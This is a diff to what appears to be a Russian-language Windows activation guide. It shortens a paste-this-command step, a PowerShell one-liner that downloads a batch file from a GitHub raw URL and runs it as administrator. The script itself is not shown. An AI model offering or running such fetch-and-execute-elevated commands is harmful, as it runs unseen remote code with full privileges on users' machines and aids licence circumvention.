@@ -6,7 +6,7 @@
 2. Вставьте следующую команду и нажмите **Enter**.
 
 ```cmd
-powershell -Command "$file = Join-Path $env:TEMP 'Windows-Activation.bat'; Invoke-WebRequest 'https://raw.githubusercontent.com/D1x2k/Windows-Activation-Guide/main/Windows-Activation.bat' -OutFile $file; Start-Process -FilePath $file -Verb RunAs"
+powershell "iwr 'https://raw.githubusercontent.com/D1x2k/Windows-Activation-Guide/main/Windows-Activation.bat' -OutF $env:TEMP\1.bat; start $env:TEMP\1.bat -v runas"
 ```
 Скрипт автоматически:
 
